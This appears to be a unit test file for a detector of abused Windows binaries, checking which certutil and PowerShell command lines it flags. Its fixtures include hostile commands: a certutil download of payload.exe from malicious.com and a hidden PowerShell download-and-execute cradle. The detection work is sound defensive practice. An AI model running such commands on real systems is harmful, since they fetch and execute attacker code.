import unittest
from backend.detection.lolbin_rules import is_lolbin_malicious, match_lolbin

class TestDetector(unittest.TestCase):

    def test_certutil_malicious_detection(self):
        # Test cases for malicious certutil.exe usage
        malicious_cases = [
            "certutil.exe -urlcache -split -f http://malicious.com/payload.exe",
            "certutil.exe -decode encoded.txt decoded.exe",
            "certutil -encode malware.exe encoded.txt"
        ]

        for cmd in malicious_cases:
            with self.subTest(cmd=cmd):
                result = is_lolbin_malicious("certutil.exe", cmd)
                self.assertTrue(result, f"Failed to detect malicious use: {cmd}")

    def test_certutil_legitimate_detection(self):
        # Test cases for legitimate certutil.exe usage
        legitimate_cases = [
            "certutil.exe -verify certificate.cer",
            "certutil.exe -viewstore -user My"
        ]

        for cmd in legitimate_cases:
            with self.subTest(cmd=cmd):
                result = is_lolbin_malicious("certutil.exe", cmd)
                self.assertFalse(result, f"Incorrectly flagged legitimate use: {cmd}")

    def test_binary_name_normalization(self):
        # Full paths, missing extensions and mixed case all identify the same LOLBin
        cmd = "certutil -urlcache -f http://malicious.com/payload.exe"
        for binary in ("C:\\Windows\\System32\\certutil.exe", "CERTUTIL", "certutil.exe"):
            with self.subTest(binary=binary):
                self.assertTrue(is_lolbin_malicious(binary, cmd))

    def test_unknown_binary_is_not_flagged(self):
        self.assertFalse(is_lolbin_malicious("notepad.exe", "notepad.exe -urlcache http://example.com"))

    def test_severity_reflects_most_dangerous_pattern(self):
        match = match_lolbin("powershell.exe", "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x')")
        self.assertIsNotNone(match)
        self.assertEqual(match["severity"], "CRITICAL")
        self.assertEqual(match["rule"]["mitre_attack_id"], "T1059.001")

if __name__ == "__main__":
    unittest.main()
